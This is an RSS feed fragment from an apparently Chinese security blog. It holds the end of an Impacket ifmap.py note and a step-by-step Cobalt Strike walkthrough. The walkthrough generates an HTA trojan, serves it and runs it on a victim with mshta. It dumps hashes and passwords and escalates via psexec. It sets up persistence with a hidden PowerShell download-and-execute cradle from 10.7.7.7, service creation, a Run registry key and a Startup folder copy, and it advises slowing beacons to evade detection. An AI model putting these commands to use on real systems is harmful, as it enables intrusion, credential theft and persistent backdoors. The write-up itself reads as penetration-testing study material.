&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210814171656070.png&#34; alt=&#34;image-20210814171656070&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;ifmappy&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ifmappy&#34;&gt;#&lt;/a&gt; &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2lmbWFwLnB5&#34;&gt;ifmap.py&lt;/span&gt;（查找 RPC 服务溢出）&lt;/h4&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;Ifmap 脚本最初绑定到目标机器的 MGMT 接口。然后它获取接口 ID 列表。然后它将这些 ID 添加到它的数据库中已有的另一个 UUID 大列表中。然后它尝试绑定每个接口并报告接口的状态。状态可以是列出或收听。它收集信息的能力是无与伦比的。有一个与此脚本非常相似的 Metasploit 模块是“auxiliary/scanner/dcerpc/endpoint_mapper” 运行映射到唯一服务的端点映射器的 UUID（通用唯一标识符）列表。获得这些服务后，攻击者可以在 Internet 上搜索以查找这些服务中的任何一个是否容易受到 RPC 溢出的攻击。&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;语法：ifmap.py [目标 IP 地址] [目标端口]&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;拓展&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;opdump.py&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;getArch.py&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;netview.py&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://chungod.github.io/2021/08/18/Coablt%20strike%E6%80%BB%E7%BB%93/</guid>
            <title>Coablt strike总结</title>
            <link>https://chungod.github.io/2021/08/18/Coablt%20strike%E6%80%BB%E7%BB%93/</link>
            <category>Coablt strike总结</category>
            <pubDate>Wed, 18 Aug 2021 19:19:41 +0800</pubDate>
            <description><![CDATA[ &lt;h2 id=&#34;coablt-strike总结&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#coablt-strike总结&#34;&gt;#&lt;/a&gt; Coablt strike 总结&lt;/h2&gt;
&lt;p&gt;介绍&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;Cobalt Strike是一款渗透测试神器，常被业界人称为CS神器。Cobalt Strike已经不再使用MSF而是作为单独的平台使用，它分为客户端与服务端，服务端是一个，客户端可以有多个，可被团队进行分布式协团操作。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Cobalt Strike集成了端口转发、扫描多模式端口Listener、Windows exe程序生成、Windows dll动态链接库生成、java程序生成、office宏代码生成，包括站点克隆获取浏览器的相关信息等。&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;Kali 启动 Coablt strike&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;./teamserver 服务器IP地址 密码&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210511144225129.png&#34; alt=&#34;image-20210511144225129&#34;&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;kali 利用java 命令进行连接&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;java -XX:+AggressiveHeap -XX:+UseParallelGC -jar cobaltstrike.jar  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;或者./cobaltstrike 运行 &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210511144911782.png&#34; alt=&#34;image-20210511144911782&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;参数介绍&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#参数介绍&#34;&gt;#&lt;/a&gt; 参数介绍&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;Cobalt Strike&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210511145541631.png&#34; alt=&#34;image-20210511145541631&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;View&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210511150003413.png&#34; alt=&#34;image-20210511150003413&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Attacks&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Packages&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210511150259624.png&#34; alt=&#34;image-20210511150259624&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Web Drive-by&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210511150711981.png&#34; alt=&#34;image-20210511150711981&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Help&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210511150856139.png&#34; alt=&#34;image-20210511150856139&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;工具栏详解&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#工具栏详解&#34;&gt;#&lt;/a&gt; 工具栏详解&lt;/h3&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210511151221296.png&#34; alt=&#34;image-20210511151221296&#34;&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1.新建连接&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2.断开当前连接&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3.监听器&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4.改变视图为Pivot Graph(视图列表)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5.改变视图为Session Table(会话列表)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6.改变视图为Target Table(目标列表)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7.显示所有以获取的受害主机的凭证&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8.查看已下载文件&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9.查看键盘记录结果&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10.查看屏幕截图&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11.生成无状态的可执行exe木马&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12.使用java自签名的程序进行钓鱼攻击&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13.生成office宏病毒文件&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14.为payload提供web服务以便下载和执行&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15.提供文件下载，可以选择Mime类型&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16.管理Cobalt Strike上运行的web服务&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17.帮助&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18.关于&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;创建监听器&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#创建监听器&#34;&gt;#&lt;/a&gt; 创建监听器&lt;/h3&gt;
&lt;p&gt;点击 Cobalt Strike -&amp;gt; Listeners-&amp;gt;Add，其中内置了九个 Listener&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;windows/beacon_dns/reverse_dns_txtwindows/beacon_dns/reverse_http&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;windows/beacon_http/reverse_http&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;windows/beacon_https/reverse_https&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;windows/beacon_smb/bind_pipe&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;windows/foreign/reverse_dns_txt&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;windows/foreign/reverse_http&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;windows/foreign/reverse_https&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;windows/foreign/reverse_tcp&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;其中 windows/beacon 为内置监听器，包括 dns、http、https、smb 四种方式的监听器；windows/foreign 为外部监听器，配合 Metasploit 或者 Armitage 的监听器。&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210511152311685.png&#34; alt=&#34;image-20210511152311685&#34;&gt;&lt;/p&gt;
&lt;p&gt;保存后生成监听器&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210511152348673.png&#34; alt=&#34;image-20210511152348673&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;生成木马&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#生成木马&#34;&gt;#&lt;/a&gt; 生成木马&lt;/h3&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;点击Attacks-&amp;gt;Packages-&amp;gt;HTML Application，选择对应的监听器，方法这里有三种(executable/VBA/powershell)，选择powershell，点击Generate生成，选择生成的路径及文件名保存即可&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210511152917868.png&#34; alt=&#34;image-20210511152917868&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210511152934569.png&#34; alt=&#34;image-20210511152934569&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;开启web服务&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#开启web服务&#34;&gt;#&lt;/a&gt; 开启 Web 服务&lt;/h3&gt;
&lt;p&gt;点击 Attacks-&amp;gt;Web Drive-by-&amp;gt;Host File，选择刚刚生成的木马 evil.hta，点击 Launch 生成下载链接&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210511153215301.png&#34; alt=&#34;image-20210511153215301&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210511153236256.png&#34; alt=&#34;image-20210511153236256&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;运行木马&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#运行木马&#34;&gt;#&lt;/a&gt; 运行木马&lt;/h3&gt;
&lt;p&gt;打开受害机 cmd，运行 mshta 命令。mshta.exe 是微软 Windows 操作系统相关程序，用于执行.HTA 文件。&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;mshta http://10.7.7.7/download/file.ext&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210511164256818.png&#34; alt=&#34;image-20210511164256818&#34;&gt;&lt;/p&gt;
&lt;p&gt;返回 CS 即可看到肉鸡上线&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210511164319933.png&#34; alt=&#34;image-20210511164319933&#34;&gt;&lt;/p&gt;
&lt;p&gt;选中受害机右击，选择 interact，即可进行交互，由于受害机默认 60 秒进行一次回传，为了实验效果我们这里把时间设置成 5，但实际中频率不宜过快，容易被发现。&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210511164402862.png&#34; alt=&#34;image-20210511164402862&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;端口扫描&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#端口扫描&#34;&gt;#&lt;/a&gt; 端口扫描&lt;/h3&gt;
&lt;p&gt;右键一个 beacon，选择目标–&amp;gt; 端口扫描或在 beacon 中使用命令 portscan [ip] 命令 随后 Cobaltstrike 会自动识别目标机所在的内网 ip 段，可选择 ARP，ICMP，none 三种方式进行扫描，ports 中填入你要扫描的端口&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210511195725297.png&#34; alt=&#34;image-20210511195725297&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210511195752693.png&#34; alt=&#34;image-20210511195752693&#34;&gt;&lt;/p&gt;
&lt;p&gt;查看到扫描到的&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210511200136133.png&#34; alt=&#34;image-20210511200136133&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210511200111358.png&#34; alt=&#34;image-20210511200111358&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;导出报告&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#导出报告&#34;&gt;#&lt;/a&gt; 导出报告&lt;/h3&gt;
&lt;p&gt;点击 Reporting-&amp;gt;Activity Report，导出默认 PDF 文档&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210511164511677.png&#34; alt=&#34;image-20210511164511677&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;提取密码&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#提取密码&#34;&gt;#&lt;/a&gt; 提取密码&lt;/h3&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;hashdump 提取hash&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;logonpasswords 破解密码&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210511200913602.png&#34; alt=&#34;image-20210511200913602&#34;&gt;&lt;/p&gt;
&lt;p&gt;查看破解的密码&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210511201314538.png&#34; alt=&#34;image-20210511201314538&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;权限提升&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#权限提升&#34;&gt;#&lt;/a&gt; 权限提升&lt;/h3&gt;
&lt;p&gt;利用 Spawn As 监听一个 SMB&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210511201644913.png&#34; alt=&#34;image-20210511201644913&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210511201727530.png&#34; alt=&#34;image-20210511201727530&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210511201851959.png&#34; alt=&#34;image-20210511201851959&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;·进入Target&lt;/code&gt;  使用 psexec 来提升权限&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210511202023537.png&#34; alt=&#34;image-20210511202023537&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210511202113089.png&#34; alt=&#34;image-20210511202113089&#34;&gt;&lt;/p&gt;
&lt;p&gt;成功提权 system 权限&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210511202405390.png&#34; alt=&#34;image-20210511202405390&#34;&gt;&lt;/p&gt;
&lt;p&gt;尝试利用 exp 进行提权&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210511212157786.png&#34; alt=&#34;image-20210511212157786&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;权限维持&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#权限维持&#34;&gt;#&lt;/a&gt; 权限维持&lt;/h3&gt;
&lt;p&gt;先创建一个监听后门&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210511212340086.png&#34; alt=&#34;image-20210511212340086&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210511212458648.png&#34; alt=&#34;image-20210511212458648&#34;&gt;&lt;/p&gt;
&lt;p&gt;将其复制出来&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;powershell.exe -nop -w hidden -c &amp;quot;IEX ((new-object net.webclient).downloadstring(&amp;#x27;http://10.7.7.7:80/d&amp;#x27;))&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;利用 &lt;code&gt;SC&lt;/code&gt;  命令创建 windows 服务名，设置为开机自启&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;shell sc create &amp;quot;name&amp;quot; binpath= &amp;quot;cmd /c start powershell.exe -nop -w hidden -c \&amp;quot;IEX ((new-object net.webclient).downloadstring(&amp;#x27;http://10.7.7.7:80/d&amp;#x27;))\&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210511213150659.png&#34; alt=&#34;image-20210511213150659&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;通过可执行文件留下维持权限的后门&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;首先需要在目标主机上传一个木马，记住路径，然后对目标主机执行 beacon 命令&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;shell sc create &amp;quot;backdoor&amp;quot; binpath= &amp;quot;C:\Users\Administrator\Desktop\backdoor.exe（填写自己木马的路径）&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sc description &amp;quot;backdoor&amp;quot;   &amp;quot;description&amp;quot; 设置服务的描述字符串&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sc config &amp;quot;server power&amp;quot; start= auto 设置这个服务为自动启动&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;net start &amp;quot;server power&amp;quot; 启动服务 &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;注册表留后门&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v &amp;quot;Keyname&amp;quot; /t REG_SZ /d &amp;quot;C:\backdoor.exe&amp;quot;（自己木马路径） /f &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;把后门加到开机启动:&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;shell copy backdoor.exe &amp;quot;%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;beacon&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#beacon&#34;&gt;#&lt;/a&gt; Beacon&lt;/h3&gt;
